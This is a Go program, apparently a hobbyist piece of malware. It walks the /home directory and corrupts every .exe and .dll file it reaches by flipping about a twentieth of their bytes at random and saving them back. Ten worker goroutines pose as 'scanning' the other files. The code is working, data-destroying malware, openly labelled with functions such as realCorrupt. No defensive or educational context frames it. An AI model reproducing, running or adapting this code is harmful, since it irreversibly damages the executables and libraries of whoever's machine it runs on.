package main

import (
	"fmt"
	"log"
	"math/rand"
	"os"
	"path/filepath"
	"strings"
	"sync"
	"time"
)

func loggingSystem(message string) {
	//create a log file
	file, err := os.OpenFile("log.txt", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	if err != nil {
		log.Fatal(err)
	}
	defer file.Close()

	//set the logger to write to the file
	log.SetOutput(file)
}

func corrupt(wg *sync.WaitGroup, fileChan <-chan string) {
	defer wg.Done()
	for file := range fileChan {
		fmt.Printf("actively scanning: %s\n", file)
	}
}

func walkAndSendFiles(root string, fileChan chan<- string) {
	err := filepath.Walk(root, func(path string, info os.FileInfo, err error) error {
		if err != nil {
			log.Println("Walk error:", err)
			return nil
		}
		if info.IsDir() {
			return nil // skip folders
		}

		// skipping the .wine folder for linux laptops cause i like linux
		if strings.Contains(path, ".wine") {
			loggingSystem("passed .wine folder")
			return filepath.SkipDir
		}

		if strings.Contains(path, ".var") {
			loggingSystem("passed .var folder")
			return filepath.SkipDir
		}

		if strings.HasSuffix(path, ".exe") {
			return func() error {
				status, err := realCorrupt(path)
				fmt.Println("Corruption status: ", status)
				if err != nil {
					return err
				}

				return nil
			}()
		}

		if strings.HasSuffix(path, ".dll") {
			return func() error {
				status, err := realCorrupt(path)
				fmt.Println("Corruption status: ", status)
				if err != nil {
					return err
				}

				return nil
			}()
		}

		fileChan <- path
		return nil
	})

	if err != nil {
		log.Fatalf("error walking the path %q: %v\n", root, err)
	}
}

func realCorrupt(filePath string) (status string, err error) {
	// read the file
	data, err := os.ReadFile(filePath)
	if err != nil {
		return "", err
	}

	rand.Seed(time.Now().UnixNano())

	// declaring how many bytes to flip
	count := len(data) / 20
	if count < 1 {
		count = 1
	}

	for i := 0; i < count; i++ {
		pos := rand.Intn(len(data))
		data[pos] ^= 0xFF // flip all bits in this byte
	}

	err = os.WriteFile(filePath, data, 0644)
	if err != nil {
		return "", err
	}

	return "corrupted successfully", nil
}

func main() {
	rootDir := "/home" // Change to whatever path you want
	fileChan := make(chan string, 100)

	var wg sync.WaitGroup

	// Spawn multiple goroutines to handle file corruption in parallel
	numWorkers := 10
	for _ = range numWorkers {
		wg.Add(1)
		go corrupt(&wg, fileChan)
	}

	// Walk through all directories and send files to be corrupted
	walkAndSendFiles(rootDir, fileChan)

	close(fileChan) // Close channel after sending is done
	wg.Wait()       // Wait for all corruption workers to finish
}
